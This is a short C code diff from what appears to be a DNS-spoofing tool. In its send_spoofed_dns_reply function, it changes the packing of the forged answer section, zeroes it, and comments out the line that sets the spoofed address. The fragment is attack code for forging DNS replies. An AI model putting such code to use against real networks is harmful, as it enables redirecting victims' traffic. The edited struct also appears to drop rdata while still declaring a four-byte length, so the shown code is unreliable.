@@ -52,14 +52,14 @@ struct dnshdr
     uint16_t adcount;
 };
 
-struct answer_section
+struct __attribute__((packed, aligned(2))) answer_section
 {
     uint16_t name;
     uint16_t type;
     uint16_t class_;
     uint32_t ttl;
     uint16_t rdlength;
-    uint32_t rdata;
+    // uint32_t rdata;
 };
 
 string gateway_ip;
@@ -412,13 +412,15 @@ void send_spoofed_dns_reply(char *packet)
 
     // derive the answer section
     struct answer_section *answer = (struct answer_section *)dns_query;
+    // memset 0
+    memset(answer, 0, sizeof(struct answer_section));
+    
     answer->name = htons(0xc00c);
     answer->type = htons(1);
     answer->class_ = htons(1);
     answer->ttl = htonl(5);
     answer->rdlength = htons(4);
-    answer->rdata = inet_addr("140.113.24.241");
-    // set rdata 140.113.24.241
+    // answer->rdata = inet_addr("140.113.24.241");
 
 
     // calculate total length  
